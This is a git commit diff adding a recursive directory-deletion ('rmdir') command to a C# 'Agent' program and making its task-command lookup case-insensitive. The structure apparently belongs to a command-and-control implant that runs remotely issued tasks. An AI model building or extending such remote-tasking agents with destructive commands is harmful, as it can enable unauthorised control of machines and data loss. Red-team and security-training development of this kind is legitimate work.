23fffd4e4772193cafdc85b0af8013b57e12bd92
Elias Malik <eliasrmalik@gmail.com>
2021-11-23 06:53:31 -0800

    Add rmdir and make task command code insensitive

---
+++ Agent/Commands/DeleteDirectory.cs
@@ -0,0 +1,39 @@
+﻿using Agent.Models;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+
+namespace Agent.Commands
+{
+    public class DeleteDirectory : AgentCommand
+    {
+        public override string Name => "rmdir";
+
+        public override string Execute(AgentTask task)
+        {
+            if (task.Arguments is null || task.Arguments.Length == 0)
+            {
+                return "No path provided";
+
+            }
+
+            var path = task.Arguments[0];
+
+            // Check to see if arg is bool and also then need to check if that array is actually filled or excepton will throw
+            // var recurse = bool.Parse(task.Arguments[1]);
+
+            Directory.Delete(path, true);
+
+            if (!Directory.Exists(path))
+            {
+                return $"{path} deleted";
+            
+            }
+
+            return $"Failed to delete {path}";
+        }
+    }
+}
--- Agent/Program.cs
+++ Agent/Program.cs
@@ -57,8 +57,15 @@ namespace Agent
 
         private static void HandleTask(AgentTask task)
         {
-            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command));
-            if (command is null) return;
+            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));
+            if (command is null)
+            {
+
+                SendTaskResult(task.Id, "Command not found.");
+                return;
+
+
+            }
 
 
             try
